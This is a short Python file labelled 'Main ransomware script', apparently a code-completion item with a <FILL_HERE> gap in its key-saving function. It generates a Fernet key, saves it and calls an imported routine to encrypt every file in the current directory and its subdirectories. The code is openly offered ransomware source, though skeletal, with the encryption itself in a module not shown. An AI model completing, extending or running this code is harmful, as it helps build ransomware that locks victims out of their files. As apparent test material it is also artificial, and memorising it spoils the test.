# Main ransomware script
import os
import base64
from cryptography.fernet import Fernet
from pathlib import Path
from encryptor import encrypt_files
from decryptor import decrypt_files

# Generate a key for encryption
def generate_key():
    return Fernet.generate_key()

# Save the key to a file
def save_key(key, filename='secret.key'):
    <FILL_HERE>
# Load the key from a file
def load_key(filename='secret.key'):
    with open(filename, 'rb') as key_file:
        return key_file.read()

# Main function to execute the ransomware
def main():
    key = generate_key()
    save_key(key)

    # Encrypt files in the current directory and subdirectories
    encrypt_files(key)

    print("Files have been encrypted. Your key is saved as 'secret.key'.")

if __name__ == "__main__":
    main()